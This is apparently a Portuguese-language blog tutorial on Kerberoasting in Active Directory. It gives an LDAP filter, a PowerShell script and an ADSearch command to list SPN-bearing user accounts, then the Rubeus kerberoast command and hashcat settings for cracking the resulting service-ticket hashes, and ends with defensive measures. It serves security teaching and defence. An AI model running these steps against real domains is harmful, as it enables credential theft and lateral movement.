---
title: "Kerberoasting"
excerpt: "Teoria e prática sobre Kerberoasting."
categories:
  - Hacking
tags:
  - Kerberoasting
  - Active Directory
  - SPN
  - LDAP
  - ADSearch
  - Rubeus
  - Hahscat

toc: true
---

## Teoria

Kerberoasting explora o Ticket Granting Service (TGS), que é usado para a autenticação em um serviço através do protocolo Kerberos.

O ataque envolve a solicitação de um ticket de serviço arbitrário para cada nome principal de serviço (Service Principal Name - SPN) no domínio e a tentativa de quebra offline da senha através de força bruta.

Caso a conta de serviço seja de máquina (`MACHINENAME$`), será impossível de realizar, por causa das senhas complexas e geradas aleatoriamente, porém, alguns serviços são executados por contas de um usuário normal (o usuário criou a senha) e neste caso o ataque é efetivo.

**OBS: Com a senha, a movimentação lateral se torna possível.**

![Untitled](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/e264e012-a56a-4da1-9725-6f4a0ebfc873)

A Mônica está associada ao SPN `MSSQLSvc/monica.com`.

## Extração de Contas com SPN através do LDAP

Pode-se realizar um filtro LDAP para extrair as contas que possuem mais de um SPN:

```powershell
(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

![Untitled](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/19cf4a23-3478-416a-9cd5-8b145caa6b3c)

![Untitled 1](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/e29d492f-13c9-49e3-8305-08ff57c64221)

## Extração de Contas com SPN através do Powershell

O mesmo filtro será usado através de um script poweshell.

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```

![Untitled 2](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/2a55426a-72bd-4aa2-9b5a-2efabc551fb1)

## Extração de Contas com SPN através do ADSearch

```powershell
ADSearch.exe --search "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" --attributes cn,distinguishedname,samaccountname
```

![Untitled 3](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/a6b2135b-26f4-464e-9e71-282d67cbe31e)

## Ataque

O Kerberoast pode ser realizado através do Rubeus:

```powershell
Rubeus.exe kerberoast /nowrap
```

- A opção “nowrap” remove a quebra de linha (não obrigatório).

![Untitled 3](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/191c83c5-414c-4d3d-99f0-37de737e2ff5)

## Quebrando a Senha

O Hashcat será usado para quebrar a senha.

![Untitled 4](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/bd5d1f51-f60e-46ff-8fbd-8d207321a841)

- A configuração “-m 13100” é para quebrar senhas Kerberos 5 TGS-REP (etype 23).
- O arquivo “monraybrandt-kerberoast” possui o hash encontrado.
- O arquivo “pass” contém as possíveis senhas.

![Untitled 5](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/c8b83247-89f9-4a34-bf76-98d34121fb17)

## Medidas de Proteção

- Aplicar políticas de senhas fortes (tamanho 10 ou mais, números, letras maiúsculas e minúsculas e caracteres especiais) para proteção.
- Remover e evitar SPN em contas de usuário.
- Caso realmente seja necessário, usar o Microsoft Managed Service Accounts (MSA).